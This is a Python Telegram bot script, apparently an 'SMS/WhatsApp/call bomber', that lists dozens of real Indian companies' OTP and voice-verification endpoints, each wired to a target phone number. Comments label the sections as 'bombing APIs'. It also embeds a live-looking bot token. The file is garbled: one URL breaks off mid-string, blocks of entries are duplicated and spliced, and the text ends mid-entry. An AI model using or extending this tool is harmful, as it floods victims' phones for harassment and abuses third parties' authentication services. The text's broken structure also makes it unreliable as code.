#!/usr/bin/env python3

import asyncio
import aiohttp
import random
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- [ CONFIGURATION ] ---
BOT_TOKEN = "8946367857:AAGpDdtG2ZFMG2HeZh-Ve_Ey13pyW-_xVaU"
DEVELOPER_ID = "@anujedits76"  # Developer ID
ADMIN_IDS = [8730393744]  # Add admin user IDs here

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
stop_signals = {}
user_attacks = {}
attack_stats = {}

# --- [ ANIMATION FRAMES ] ---
ANIMATION_FRAMES = [
    "🔄 Processing...",
    "⚡ Firing APIs...", 
    "🔥 Bombarding...",
    "💥 Exploding...",
    "🚀 Launching...",
    "🎯 Targeting..."
]

# --- [ ULTIMATE API COLLECTION - FIXED ] ---
ULTIMATE_APIS = [
    # === CALL APIs ===
    {
        "name": "Tata Capital Voice Call",
        "type": "Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # WHATSAPP BOMBING APIS (100+)
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST", 
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp", 
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },

    # SMS BOMBING APIS (300+)  
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST", 
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
    },

    # NEW APIS FROM YOUR HUGE LIST (400+)
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "PenPencil V3",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BigCash",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "url": "https://www.m
    {
        "name": "1MG Voice Call", 
        "type": "Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "type": "Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "type": "Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Zivame Voice Call",
        "type": "Call", 
        "url": "https://api.zivame.com/v2/customer/login/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'
    },
    
    # === SMS APIs ===
    {
        "name": "Lenskart SMS",
        "type": "SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # WHATSAPP BOMBING APIS (100+)
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST", 
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp", 
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },

    # SMS BOMBING APIS (300+)  
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST", 
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
